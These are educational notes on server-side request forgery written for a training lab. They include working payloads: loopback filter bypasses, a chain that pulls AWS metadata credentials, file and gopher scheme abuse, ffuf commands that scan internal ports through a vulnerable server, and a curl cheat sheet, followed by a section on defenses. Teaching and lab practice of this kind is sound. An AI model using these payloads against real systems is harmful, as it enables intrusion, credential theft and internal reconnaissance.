# SSRF — Server-Side Request Forgery

Reference notes to go with the RequestRelay lab. Written from scratch while building the lab.

---

## 1. What is SSRF?

SSRF (Server-Side Request Forgery) is a vulnerability where an attacker tricks
a **server** into making HTTP requests on their behalf — to places the attacker
couldn't reach directly (internal networks, cloud metadata APIs, loopback
services, other internal hosts).

The key idea: **the server is the proxy.** The attacker never touches the
internal resource directly. The server does, and returns the result.

```
Attacker → [vulnerable server] → internal service
                                 (127.0.0.1, 10.x, 169.254.x, etc.)
```

Classic SSRF surfaces: URL preview features, webhook registration, image
proxies, PDF generators, import-from-URL features, any "fetch this for me"
functionality.

---

## 2. Types of SSRF

### 2a. Basic (reflected) SSRF
The server fetches the URL and **returns the response to you directly**.
Easiest to exploit: just supply the target URL and read the output.

**Lab**: `/fetch?url=http://127.0.0.1:5008/internal/secret`

### 2b. Blind SSRF
The server fetches the URL but **shows you nothing** — no response body
in the HTTP reply. You prove it happened via an out-of-band channel:
- **HTTP callback**: Point to a server you control, observe the inbound hit
- **DNS callback**: Use a unique subdomain on a DNS logger (Burp Collaborator,
  interactsh, canarytokens.org); if DNS is resolved, the request was made

**Lab**: `/webhook/register` → callback to `127.0.0.1:5043` → check `/webhook/log`

### 2c. Semi-blind SSRF
The server fetches the URL and gives you indirect feedback — an error message
("failed to load"), a timing difference, or a status code — but not the body.
You can still probe: success vs failure on a port-by-port basis = port scan.

### 2d. Cloud metadata SSRF
In cloud environments (AWS, GCP, Azure), every VM instance has a metadata
service accessible from loopback that leaks credentials, SSH keys, user-data
scripts, and IAM role tokens. No auth required from inside the VM.

| Provider | Metadata URL                              |
|----------|-------------------------------------------|
| AWS      | `http://169.254.169.254/latest/meta-data/`|
| GCP      | `http://metadata.google.internal/`        |
| Azure    | `http://169.254.169.254/metadata/instance`|

**The classic AWS chain**:
1. `GET /latest/meta-data/iam/security-credentials/` → list role names
2. `GET /latest/meta-data/iam/security-credentials/<role>` → get temp keys
3. Use `AccessKeyId` + `SecretAccessKey` + `Token` as AWS credentials → full
   API access under that role

**Lab**: `/avatar?image_url=http://127.0.0.1:5042/latest/meta-data/iam/security-credentials/lab-role`

---

## 3. What can you reach via SSRF?

| Target                      | Why it matters                                |
|-----------------------------|-----------------------------------------------|
| `127.0.0.1` / loopback      | Services running only locally (admin panels, internal APIs) |
| `10.x.x.x`, `172.16-31.x.x`, `192.168.x.x` | Internal network — other hosts, databases, services |
| `169.254.169.254`           | Cloud metadata (AWS/GCP/Azure)                |
| `file:///etc/passwd`        | Local file read (if `file://` scheme is allowed) |
| Other ports on the host     | Port scanning, service fingerprinting         |

---

## 4. Filter bypasses

Developers often try to fix SSRF by blocking "127.0.0.1" and "localhost" as
strings. These blocks almost always fail because there are many ways to
express the same address:

| Technique               | Example                              | Notes                        |
|-------------------------|--------------------------------------|------------------------------|
| Decimal IP              | `http://2130706433/`                 | 127.0.0.1 in base-10         |
| Octal IP                | `http://0177.0.0.1/`                 | 127 in octal = 0177          |
| Hex IP                  | `http://0x7f000001/`                 | 127.0.0.1 in hex             |
| Short IP                | `http://127.1/`                      | Valid, resolves to 127.0.0.1 |
| Compressed IP           | `http://0.0.0.0/`                    | Resolves to loopback on Linux |
| IPv6 loopback           | `http://[::1]/`                      | IPv6 form                    |
| DNS rebinding           | Use a domain that resolves to 127.x  | DNS checked → resolves later |
| URL-encoded `@`         | `http://evil.com@127.0.0.1/`         | Host is 127.0.0.1, confused parsers |
| URL scheme swap         | `gopher://`, `dict://`, `file://`    | If other schemes are allowed  |
| Open redirect chain     | `http://trusted.com/redirect?to=...` | Filter checks first URL only  |

**Lab bypass forms for FLAG 4**:
```
http://2130706433:5008/internal/secret   # decimal
http://127.1:5008/internal/secret        # short form
http://0.0.0.0:5008/internal/secret     # zero form
http://[::1]:5008/internal/secret       # IPv6
```

---

## 5. Schemes beyond HTTP

If the app doesn't restrict URL scheme:

```
file:///etc/passwd              # local file read
gopher://127.0.0.1:25/...       # interact with raw TCP services (SMTP, Redis)
dict://127.0.0.1:11211/...      # interact with Memcached
sftp://, tftp://, ldap://...    # depends on the HTTP library
```

Python's `requests` and most HTTP clients only follow `http://` and `https://`
by default, but check what library the target is using.

---

## 6. How to find SSRF

1. **Look for URL parameters**: `?url=`, `?src=`, `?href=`, `?redirect=`, `?feed=`, `?img=`, `?page=`, `?path=`
2. **Look for fetch/import features**: "Import from URL," "Load image," "Preview link," "Generate PDF," "Webhook callback," "Ping URL"
3. **Fuzz for parameters with ffuf**: even hidden params can accept URLs
4. **Check POST bodies**: JSON/XML payloads often contain URLs for server-side processing
5. **Intercept everything in Burp**: look for requests where you supplied a URL and the server made an outbound request

---

## 7. Exploiting blind SSRF

Since you get no response body, you need an out-of-band channel:

**Option A — HTTP callback to a server you control**:
```bash
# Spin up a quick listener
python3 -m http.server 8080
# or use ngrok to expose it publicly
ngrok http 8080
# Then register your public URL as the callback
```

**Option B — Burp Collaborator**:
Burp Pro provides a unique subdomain (`xxx.oastify.com`). Any DNS query or
HTTP request to it shows up in the Collaborator panel. Use it as the callback
URL and observe the hit.

**Option C — interactsh / canarytokens.org** (free alternatives):
```bash
# interactsh-client gives you a unique domain
interactsh-client
# Any DNS/HTTP hit to it is logged and shown to you
```

**Port scanning via blind SSRF**:
```
http://10.0.0.1:22/     → no connection / timeout → port closed
http://10.0.0.1:80/     → connection made (even if no body) → port open
```
Timing differences reveal which ports are open.

---

## 8. SSRF via ffuf (what your internship task is probably about)

You can use ffuf to discover what internal hosts/ports a vulnerable server can
reach, by fuzzing the IP or port:

```bash
# Port scan internal host via SSRF
ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt \
     -u "http://target.com/fetch?url=http://127.0.0.1:FUZZ/" \
     -fs 0 -mc 200

# Host discovery on internal subnet
ffuf -w /tmp/ips.txt \
     -u "http://target.com/fetch?url=http://FUZZ/" \
     -fs 0 -mc 200

# Enumerate AWS metadata paths
ffuf -w /usr/share/seclists/Fuzzing/aws-metadata-endpoints.txt \
     -u "http://target.com/fetch?url=http://169.254.169.254/FUZZ" \
     -mc 200
```

The idea: the server becomes your scanner. You make the server probe the
internal network and report back.

---

## 9. Defenses (and why they fail)

| Defense                        | Weakness                                           |
|--------------------------------|----------------------------------------------------|
| Block `127.0.0.1`, `localhost` | Bypassed with decimal/octal/hex/short IP forms     |
| Allowlist of allowed domains   | Bypassed with open redirects on trusted domains    |
| DNS resolution check at request time | DNS rebinding: domain resolves to 127.x after check |
| Block RFC-1918 ranges          | Need to block after DNS resolution, not before     |

**Correct defenses**:
1. **Allowlist outbound IPs/domains** (not a blocklist) — only let the server
   reach exactly what it needs to reach
2. **Resolve the hostname to an IP, then validate the IP** against an RFC-1918
   / loopback blocklist — check the final destination, not the URL string
3. **Disable unnecessary URL-fetch features** entirely
4. **Use a dedicated egress proxy** (a firewall that only allows specific destinations)
5. **Strip cloud metadata access** via instance firewall rules (IMDSv2 on AWS
   requires a session token and prevents simple SSRF chains)

---

## 10. Cheat sheet

```bash
# Basic SSRF
curl "http://target/fetch?url=http://127.0.0.1/internal"

# Metadata endpoint (AWS)
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Filter bypass: decimal IP
curl "http://target/fetch?url=http://2130706433/internal"

# Filter bypass: short IP
curl "http://target/fetch?url=http://127.1/internal"

# Filter bypass: IPv6
curl "http://target/fetch?url=http://[::1]/internal"

# Blind SSRF: register callback, check log
curl -X POST "http://target/webhook" --data "url=http://your-server:8080/"

# Port probe via SSRF
curl "http://target/fetch?url=http://10.0.0.1:6379/"  # Redis

# SSRF + ffuf: port scan
ffuf -w ports.txt -u "http://target/fetch?url=http://127.0.0.1:FUZZ/" -fs 100
```

---

*RequestRelay lab · Fire Labs · Zayed Feroz Kazi*
